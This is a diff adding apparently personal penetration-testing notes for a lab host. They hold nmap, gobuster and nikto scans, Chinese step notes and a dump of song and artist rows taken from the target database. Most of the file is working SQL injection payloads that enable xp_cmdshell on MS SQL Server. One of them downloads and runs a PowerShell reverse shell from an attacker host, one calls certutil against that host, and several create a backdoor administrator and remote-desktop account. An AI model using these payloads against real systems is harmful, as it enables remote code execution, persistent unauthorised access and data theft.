@@ -1,0 +1,78 @@
+nmap -sC -sV -Pn 10.11.1.128 > nmap.txxt
+nmap -p-  10.11.1.128 > nmapall.txxt
+nmap -sU 10.11.1.128 > nmapuu.txxt
+gobuster dir  -u http://10.11.1.128:4167/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+gobuster dir  -u http://10.11.1.128:4167/aspnet_client/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobusterasp.txt
+gobuster dir  -u http://10.11.1.128:4167/aspnet_client/system_web/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobusteraspsys.txt
+
+
+
+nikto -h http://10.11.1.128:4167 > nikto.txt
+
+1.nmap全端口掃描找出4167端口起者iis服務
+2.使用nikto查找4167端口發現login.jsp頁面可以訪問
+3.使用bypass登入後,參考使用SQL Injection
+https://www.exploit-db.com/papers/12975
+4.SQL Injection
+此句可以將所有數據導出
+id=2' or '1'='1
+5.此據測試可在後面執行指令
+SELECT * FROM user WHERE userid = "-1" AND 1=2; WAITFOR DELAY '0:0:5'; -- "
+id=2' or '1'='1' ; WAITFOR DELAY '0:0:5
+6.啟用xp_cmdshell功能
+id=2' or '1'='1' ;EXEC xp_cmdshell 'powershell IEX (New-Object Net.WebClient).DownloadString("http://192.168.119.134/Invoke-PowerShellTcp.ps1");--
+id=2' or '1'='1' ;EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
+id=2' or '1'='1' ;EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+id=2' or '1'='1' ;EXEC sp_configure 'xp_cmdshell', 1;--
+id=2' or '1'='1' ;RECONFIGURE;--
+7.創建用戶並將用戶加入到remtoe及administrator群組
+id=2' or '1'='1' ; exec xp_cmdshell 'net user timmy timmy /add'; --
+id=2' or '1'='1' ; exec xp_cmdshell 'net  localgroup "Remote Desktop Users" "timmy" /add'; --
+id=2' or '1'='1' ; exec xp_cmdshell 'net  localgroup "Administrators" "timmy" /add'; --
+
+
+
+
+id=2' or '1'='1' SELECT @@version --;WAITFOR DELAY '0:0:5
+id=2' or '1'='1' SELECT @@version --;EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.119.134/';--
+
+' select 1,2-- EXEC sp_configure 'show advanced options', 1;
+' select 1,2-- RECONFIGURE;
+' select 1,2-- EXEC sp_configure 'xp_cmdshell', 1;
+' select 1,2-- RECONFIGURE;
+
+' select 1,2-- exec xp_cmdshell whoami;
+
+
+
+Song name: Alice - From the year: 1994
+Song name: Cloudburst - From the year: 1994
+Song name: Columbia - From the year: 1994
+Song name: Headshrinker - From the year: 1995
+Song name: Lyla - From the year: 2005
+Song name: Whatever - From the year: 1994
+Song name: Wonderwall - From the year: 1994
+Song name: Cure - From the year: 1996
+Song name: Attitude - From the year: 1997
+Song name: Frustration - From the year: 2011
+Song name: Purify - From the year: 2003
+Song name: Astronomy - From the year: 1998
+Song name: Escape - From the year: 1984
+Song name: Bliztkrieg - From the year: 1984
+
+Artist name: Oasis - From the year: 1994
+Artist name: Oasis - From the year: 1994
+Artist name: Oasis - From the year: 1994
+Artist name: Oasis - From the year: 1995
+Artist name: Oasis - From the year: 2005
+Artist name: Oasis - From the year: 1994
+Artist name: Oasis - From the year: 1994
+Artist name: Metallica - From the year: 1996
+Artist name: Metallica - From the year: 1997
+Artist name: Metallica - From the year: 2011
+Artist name: Metallica - From the year: 2003
+Artist name: Metallica - From the year: 1998
+Artist name: Metallica - From the year: 1984
+Artist name: Metallica - From the year: 1984
+
+
